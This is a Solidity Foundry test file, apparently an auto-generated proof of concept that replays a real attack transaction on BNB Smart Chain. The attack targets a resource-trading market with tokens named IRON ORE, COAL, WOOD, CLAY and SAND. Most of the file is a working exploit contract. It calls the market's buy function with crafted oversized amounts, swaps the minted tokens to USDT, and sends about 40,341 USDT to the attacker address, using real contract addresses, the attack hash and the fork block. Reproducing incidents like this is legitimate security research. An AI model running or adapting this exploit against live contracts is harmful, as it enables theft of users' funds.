// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0xdbca72816b83a60f5ca7cf93a1420c6e7b215aca
// Attack Contract : 0x23e5de4a390702b1ff6da7fd0b0f17b79f8eee1a
// Vulnerable Contract : N/A
// Attack Tx : 0xb4a29409cbd018956746f90d285f427175070c735c36ff3bc2f3c4a4bbaae705
// Block : 82115373
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 82115372;
    uint256 constant TX_TIMESTAMP = 1771497666;
    uint256 constant TX_BLOCK_NUMBER = 82115373;
    uint256 constant TX_VALUE = 10000000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _installAttackCode();
        attack = OurAttack(payable(ATTACK_CONTRACT));
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installAttackCode() internal {
        // Preserve the exact attack-contract address used by the constructor-time exploit.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        profitLegs.push(
            ProfitLeg(
                Addresses.ATTACK_CONTRACT,
                attack,
                Addresses.IRON_ORE,
                "IRON ORE",
                70314684686449557564586932375201211164216764611199923536447246434118876764224,
                false,
                PROFIT_REPAIR_OBSERVE_ONLY,
                false
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.ATTACK_CONTRACT,
                attack,
                Addresses.COAL,
                "COAL",
                48599816391402292142884182199592416313987904982040904182833562980793129884416,
                false,
                PROFIT_REPAIR_OBSERVE_ONLY,
                false
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.ATTACK_CONTRACT,
                attack,
                Addresses.WOOD,
                "WOOD",
                1817185950784157460406130719162608686860222405947175989465730563878246572544,
                false,
                PROFIT_REPAIR_OBSERVE_ONLY,
                false
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.ATTACK_CONTRACT,
                attack,
                Addresses.CLAY,
                "CLAY",
                82708635169511568159693560720491362752335703329096349831380787139503151618240,
                false,
                PROFIT_REPAIR_OBSERVE_ONLY,
                false
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.ATTACK_CONTRACT,
                attack,
                Addresses.SAND,
                "SAND",
                115704281925814854399929129511507650688925781895065818803335855272844661279936,
                false,
                PROFIT_REPAIR_OBSERVE_ONLY,
                false
            )
        );
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.USDT, "USDT", 40341541995032481116169);
    }
}

contract OurAttack {
    constructor() payable {}

    function attack() external payable {
        _openUsdtPosition();
        _tradeIronAndCoal();
        _tradeWoodAndSand();
        _tradeClayAndSettle();
    }

    function _openUsdtPosition() internal {
        IResourceMarket(Addresses.PEARL_MARKET).stableCoin();
        IPancakeRouter(Addresses.PancakeRouter).swapExactETHForTokens{value: 10000000000000000}(
            0, _addressArray2(Addresses.WBNB, Addresses.USDT), address(this), 1771497666
        );
        IERC20Like(Addresses.USDT).approve(Addresses.PEARL_MARKET, type(uint256).max);
    }

    function _tradeIronAndCoal() internal {
        IResourceMarket(Addresses.PEARL_MARKET).getPrices(Addresses.IRON_ORE, 0);
        IResourceMarket(Addresses.PEARL_MARKET)
            .buy(Addresses.IRON_ORE, 0, 0x4ccafd7a80a3bef5f66b93b08e68184f3fdac1acc0ca4fcddd1);
        _balanceIfCode(Addresses.IRON_ORE, Addresses.PearlDex_IRON_ORE_USDT);
        _approveIfCode(Addresses.IRON_ORE, 857177232617209043614567000000);
        _swapToUsdt(Addresses.IRON_ORE, 857177232617209043614567000000);

        IResourceMarket(Addresses.PEARL_MARKET).getPrices(Addresses.COAL, 0);
        IResourceMarket(Addresses.PEARL_MARKET)
            .buy(Addresses.COAL, 0, 0x3209c864922e6ec98db6101323c68098c0b48f8b4173fb2af724);
        IERC20Like(Addresses.COAL).balanceOf(Addresses.PearlDex_COAL_USDT);
        IERC20Like(Addresses.COAL).approve(Addresses.TOKEN_SWAP_ROUTER, 12069554546151135527494900000000);
        _swapToUsdt(Addresses.COAL, 12069554546151135527494900000000);
    }

    function _tradeWoodAndSand() internal {
        IResourceMarket(Addresses.PEARL_MARKET).getPrices(Addresses.WOOD, 0);
        IResourceMarket(Addresses.PEARL_MARKET)
            .buy(Addresses.WOOD, 0, 0xe1fd9f0f376edb64f8f6ec5c033b1ae3816c3b26e9a6eb285de);
        IERC20Like(Addresses.WOOD).balanceOf(Addresses.PearlDex_WOOD_USDT);
        IERC20Like(Addresses.WOOD).approve(Addresses.TOKEN_SWAP_ROUTER, 2106947190605803885148344000000);
        _swapToUsdt(Addresses.WOOD, 2106947190605803885148344000000);

        IResourceMarket(Addresses.PEARL_MARKET).getPrices(Addresses.SAND, 0);
        IResourceMarket(Addresses.PEARL_MARKET)
            .buy(Addresses.SAND, 0, 0x2d0936d3f652aced3106ee62af678f9f292f4cb599169a60b8195);
        IERC20Like(Addresses.SAND).balanceOf(Addresses.PearlDex_USDT_SAND);
        IERC20Like(Addresses.SAND).approve(Addresses.TOKEN_SWAP_ROUTER, 155416929690702649603772069000000);
        _swapToUsdt(Addresses.SAND, 155416929690702649603772069000000);
    }

    function _tradeClayAndSettle() internal {
        IResourceMarket(Addresses.PEARL_MARKET).getPrices(Addresses.CLAY, 0);
        IResourceMarket(Addresses.PEARL_MARKET)
            .buy(Addresses.CLAY, 0, 0x14967f91086261d5dda8beb70ada01700c858e394175da0be333);
        _balanceIfCode(Addresses.CLAY, Addresses.PearlDex_USDT_CLAY);
        _approveIfCode(Addresses.CLAY, 3504053053946770605254901000000);
        _swapToUsdt(Addresses.CLAY, 3504053053946770605254901000000);

        IERC20Like(Addresses.USDT).balanceOf(address(this));
        uint256 usdtProfit = 40341541995032481116169;
        IERC20Like(Addresses.USDT).transfer(Addresses.ATTACKER_EOA, usdtProfit);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function _balanceIfCode(address token, address pair) internal view {
        if (token.code.length != 0) {
            IERC20Like(token).balanceOf(pair);
            return;
        }
        _warnMissingCode(token);
    }

    function _approveIfCode(address token, uint256 amount) internal {
        if (token.code.length != 0) {
            IERC20Like(token).approve(Addresses.TOKEN_SWAP_ROUTER, amount);
            return;
        }
        _warnMissingCode(token);
    }

    function _swapToUsdt(address resourceToken, uint256 amountIn) internal {
        if (Addresses.TOKEN_SWAP_ROUTER.code.length == 0) {
            _warnMissingCode(Addresses.TOKEN_SWAP_ROUTER);
            return;
        }
        if (IERC20Like(resourceToken).allowance(address(this), Addresses.TOKEN_SWAP_ROUTER) < amountIn) {
            IERC20Like(resourceToken).approve(Addresses.TOKEN_SWAP_ROUTER, type(uint256).max);
        }
        ITokenSwapRouter(Addresses.TOKEN_SWAP_ROUTER)
            .swapExactTokensForTokens(
                amountIn, 0, _addressArray2(resourceToken, Addresses.USDT), address(this), 1771497666
            );
    }

    function _warnMissingCode(address account) internal pure {
        console2.log("PoCWarning", "skipping missing-code call", account);
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant ATTACK_CONTRACT = 0x23E5DE4a390702B1ff6dA7Fd0b0F17B79F8Eee1A;
    address internal constant IRON_ORE = 0x26C97005Af332F0D8f6ca30451195E14fbDd8D41;
    address internal constant PearlDex_COAL_USDT = 0x3119B2f98693A333394c2E68C0b31dcDe7183DAe;
    address internal constant COAL = 0x40037b7503EE21ffA7747dFDdEDcb89805c9273e;
    address internal constant WOOD = 0x414Ef9A63a05e6997a9e95e7043Ee0FDc6D5119f;
    address internal constant PEARL_MARKET = 0x5340a7278848EE51D35c30693D6FBFf06d1a0d73;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant TOKEN_SWAP_ROUTER = 0x73A0Ba8BAc1B6Ae00De1E9Cf767CdB98075Ab92e;
    address internal constant PearlDex_USDT_CLAY = 0x9095d1083a19bE8e390536E9aCaf5D4080ce87aa;
    address internal constant PearlDex_IRON_ORE_USDT = 0x9849E6828022e8b5161cd5C70f4bF38eAF78cFDe;
    address internal constant PearlDex_WOOD_USDT = 0xB38D61552658bAcdb382bb3074c104e0A2060eD0;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant ATTACKER_EOA = 0xDbCa72816b83a60f5ca7cF93a1420C6e7b215aca;
    address internal constant CLAY = 0xE9456F10bfbff68D50F842056C108894067D9a4e;
    address internal constant SAND = 0xEE4B91DcCa8521c549db0A2d33607869d187414f;
    address internal constant PearlDex_USDT_SAND = 0xF5784cbdd3D64dbDF882fD9F5B89109793E9f7E6;
}

interface ITokenSwapRouter {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IPancakeRouter {
    function swapExactETHForTokens(uint256, address[] calldata, address, uint256) external payable;
}

interface IResourceMarket {
    function buy(address, uint256, uint256) external;
    function getPrices(address, uint256) external view;
    function stableCoin() external view returns (uint256);
    function buy() external;
}
